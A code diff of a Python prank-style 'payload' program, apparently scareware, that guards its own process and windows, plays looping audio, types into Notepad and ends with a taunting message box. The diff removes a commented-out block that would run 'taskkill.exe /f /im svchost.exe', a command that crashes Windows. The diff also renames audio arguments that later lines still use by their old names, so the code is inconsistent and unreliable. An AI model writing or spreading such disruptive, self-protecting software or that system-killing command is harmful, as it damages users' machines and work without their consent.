@@ -15,28 +15,23 @@ class SuuraMainPayload:
         self.process_protect = ProcessProtection()
         self.window_protect = WindowProtection()
         self.audio_player = AudioPlayer(
-            main_bg_wav=lib_path(to_nt_path("assets/audio/main_bg_old.wav")),
-            surprise_motherfucker=lib_path(to_nt_path("assets/audio/suprise_motherfucker.wav"))
+            song1=lib_path(to_nt_path("assets/audio/song1.wav")),
+            song2=lib_path(to_nt_path("assets/audio/song2.wav"))
         )
         self.audio_player.main_bg_wav.loop = True
         self.notepad_payload = TyperPayload()
-        self.notepad_payload.stage_edit_key(2,"on_close_function",self.end_stage_close_function)
+        self.notepad_payload.stage_edit_key(2,
+                                            "on_close_function",
+                                            self.end_stage_close_function
+                                            )
     def end_stage_close_function(self):
         self.audio_player.main_bg_wav.stop()
         self.audio_player.surprise_motherfucker.play()
-        """self.notepad_payload.stages = {
-            "real_msg":"Sonu kötü olur demiştim!",
-            "user_accept_msg":"",
-            "user_not_accepted_msg":"",
-            "user_accepted_msg":"",
-            "on_close_function":execute("taskkill.exe /f /im svchost.exe")
-        }
-        """
         self.notepad_payload.close_all_notepad_windows()
         MessageBox(
             box = PreDialogs.DIA_OK_WITH_QUESTION_ICO,
-            text = "Sonucu kötü olur demiştim brooo",
-            title = "Adiooos"
+            text = "ERR_BAD_MSG_IDENTIFIER",
+            title = "ERR_MSG_BAD_MSG"
         )
     def start(self):
         self.process_protect.start()
